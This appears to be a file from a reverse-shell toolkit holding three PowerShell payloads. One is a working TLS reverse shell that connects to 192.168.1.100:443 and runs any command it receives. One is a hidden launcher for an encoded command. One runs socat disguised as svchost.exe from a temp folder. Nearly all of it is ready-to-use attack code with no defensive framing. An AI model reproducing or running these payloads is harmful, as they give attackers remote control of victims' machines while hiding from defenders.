# PowerShell Payloads for Reverse Shell Toolkit

# Payload 1: Mutual TLS Reverse Shell
$client = New-Object System.Net.Sockets.TcpClient("192.168.1.100",443)
$stream = $client.GetStream()
$ssl = New-Object System.Net.Security.SslStream($stream,$false,({$True}))
$ssl.AuthenticateAsClient("reverse-shell")
$writer = new-object System.IO.StreamWriter($ssl)
$buffer = new-object byte[] 1024

while(($bytes = $ssl.Read($buffer, 0, $buffer.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $bytes)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $ssl.Write($sendbyte,0,$sendbyte.Length)
    $ssl.Flush()
}

# Payload 2: Base64 Encoded Payload Launcher
$cmd = "powershell -NoP -NonI -W Hidden -EncodedCommand <base64-encoded-command-here>"
iex $cmd

# Payload 3: Using socat renamed as svchost.exe
Start-Process -WindowStyle Hidden -FilePath "C:\Windows\Temp\svchost.exe" -ArgumentList "STDIO OPENSSL:192.168.1.100:443,verify=0"
